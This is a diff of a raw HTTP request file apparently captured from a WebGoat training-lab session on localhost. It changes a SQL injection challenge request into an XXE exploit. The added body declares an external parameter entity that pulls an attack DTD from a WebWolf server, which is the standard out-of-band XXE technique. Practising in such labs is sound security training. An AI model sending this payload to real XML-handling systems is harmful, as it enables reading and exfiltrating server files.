@@ -1,9 +1,9 @@
-PUT /WebGoat/SqlInjectionAdvanced/challenge HTTP/1.1
+POST /WebGoat/xxe/simple HTTP/1.1
 Host: 127.0.0.1:8080
-Content-Length: 68
+Content-Length: 172
 sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120"
 Accept: */*
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Type: application/xml
 X-Requested-With: XMLHttpRequest
 sec-ch-ua-mobile: ?0
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
@@ -18,4 +18,4 @@ Accept-Language: en-US,en;q=0.9
 Cookie: JSESSIONID=UB6carQbO85SkC3tntO5yUK_3RDABVFWY7Hq0Z6i
 Connection: close
 
-username_reg=a&email_reg=a%40a&password_reg=a&confirm_password_reg=a
+<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://127.0.0.1:9090/WebWolf/files/location/attack.dtd">%remote;]><comment><text>test&ping;</text></comment>
